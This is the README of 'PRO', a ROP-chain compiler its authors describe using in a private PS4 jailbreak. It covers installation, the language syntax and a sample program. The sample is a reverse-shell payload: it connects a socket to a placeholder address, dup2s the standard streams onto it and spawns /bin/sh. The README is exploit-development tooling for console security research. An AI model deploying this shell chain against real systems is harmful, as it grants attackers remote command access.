#   PRO:    PROgramming ROP like a PRO

This is a crappy tool used in our private PS4 jailbreak. Since some version, the internal browser is compiled WITHOUT jit support, and sys\_jitshm\_xxx seems to be disabled for unprivileged process. We have to write the kernel exploitation in ROP, like what has been done in HENKaku jailbreak.

##  Build
```shell
pip install git+https://github.com/chaitin/pro
```

If you have modified the `pro.g4` file, use the following commands to
generate new lexer and parser.
```shell
cd pro/parse && antlr4 -no-listener -visitor -Dlanguage=Python2 pro.g4
```

##  Examples
```javascript
toy {
	{% include "gadgets.pro" %}
	{% include "glibc.pro" %}
	const AF_INET(2);
	const SOCK_STREAM(1);
	const IPPROTO_IP(0);
	var fd;
	socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	func store_rdx_rax<libc, 0x0002e60c, "rdx,rax::">;
	store_rdx_rax(&fd, undefined);
	printf("socket fd = %d\n", fd);
	array addr["\x02\x00\x41\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"];
	connect(fd, addr, 0x10);
	{% for i in range(3): %}
		dup2(fd, {{i}});
	{% endfor %}
	system("/bin/sh");
	exit(1);
}

```

##  Usage
A BIG TODO. Just try and learn by yourself.

##  Quick Guide
All expressions should be evaluated during compilation, Const/Func should
be initialized in declaration.

Func is initialized with <Base, Offset, Signature>. Base/Offset is used for
relocation, Signature determines the calling convention of Func.

Array can be declared with size(Int) or directly initialized with its content(String).

For loop should be written in template script, it will be rendered
before compilation. For more information, check
[Jinja2](http://jinja.pocoo.org/).

